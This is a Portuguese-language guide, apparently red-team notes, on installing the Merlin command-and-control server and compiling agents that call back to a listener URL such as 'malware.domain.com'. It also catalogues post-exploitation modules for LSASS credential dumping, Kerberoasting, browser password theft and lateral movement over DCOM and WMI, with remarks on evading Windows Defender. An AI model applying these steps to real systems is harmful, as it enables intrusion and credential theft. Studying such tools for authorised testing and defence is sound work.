# Instalação

## Instale o GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Instalar Merlin
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Iniciar o Servidor Merlin
```
go run cmd/merlinserver/main.go -i
```
# Agentes do Merlin

Você pode [baixar agentes pré-compilados](https://github.com/Ne0nd0g/merlin/releases)

## Compilar Agentes

Vá para a pasta principal _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **Compilação manual de agentes**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# Módulos

**A má notícia é que cada módulo usado pelo Merlin é baixado da fonte (Github) e salvo no disco antes de ser usado. Tenha cuidado ao usar módulos conhecidos porque o Windows Defender irá detectá-lo!**


**SafetyKatz** --> Mimikatz modificado. Despeja LSASS em um arquivo e executa: sekurlsa::logonpasswords para esse arquivo\
**SharpDump** --> minidespejo para o ID do processo especificado (LSASS por padrão) (É dito que a extensão do arquivo final é .gz, mas na verdade é .bin, mas é um arquivo .gz)\
**SharpRoast** --> Kerberoast (não funciona)\
**SeatBelt** --> Testes de segurança local em CS (não funciona) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> Compila usando csc.exe /unsafe\
**Sharp-Up** --> Todos os testes em C# em powerup (funciona)\
**Inveigh** --> Ferramenta de spoofing e man-in-the-middle PowerShellADIDNS/LLMNR/mDNS/NBNS (não funciona, precisa carregar: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> Impersonifica todos os usuários disponíveis e recupera um desafio-resposta para cada um (hash NTLM para cada usuário) (URL ruim)\
**Invoke-PowerThIEf** --> Rouba formulários do IExplorer ou faz com que ele execute JS ou injete uma DLL nesse processo (não funciona) (e o PS parece que também não funciona) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> Obter senhas do navegador (funciona, mas não imprime o diretório de saída)\
**dumpCredStore** --> API do Win32 Credential Manager (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> Detecta injeção clássica em processos em execução (Injeção clássica (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (não funciona)\
**Get-OSTokenInformation** --> Obter informações do token dos processos e threads em execução (Usuário, grupos, privilégios, proprietário... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> Executa um comando (em outro computador) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> Executa um comando em outro PC abusando dos objetos COM do PowerPoint (ADDin)\
**Invoke-ExcelMacroPivot** --> Executa um comando em outro PC abusando do DCOM no Excel\
**Find-ComputersWithRemoteAccessPolicies** --> (não funciona) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> Ele despeja todas as partes mais interessantes da política de grupo e depois procura por coisas exploráveis. (descontinuado) Dê uma olhada no Grouper2, parece muito bom\
**Invoke-WMILM** --> WMI para mover lateralmente\
**Get-GPPPassword** --> Procura por groups.xml, scheduledtasks.xml, services.xml e datasources.xml e retorna senhas em texto simples (dentro do domínio)\
**Invoke-Mimikatz** --> Usa o mimikatz (credenciais padrão de despejo)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> Verifica os privilégios dos usuários nos computadores\
**Find-PotentiallyCrackableAccounts** --> Recupera informações sobre contas de usuário associadas ao SPN (Kerberoasting)\
**psgetsystem** --> getsystem

**Não verifiquei os módulos de persistência**

# Resumo

Eu realmente gosto da sensação e do potencial da ferramenta.\
Espero que a ferramenta comece a baixar os módulos do servidor e integre algum tipo de evasão ao baixar scripts.
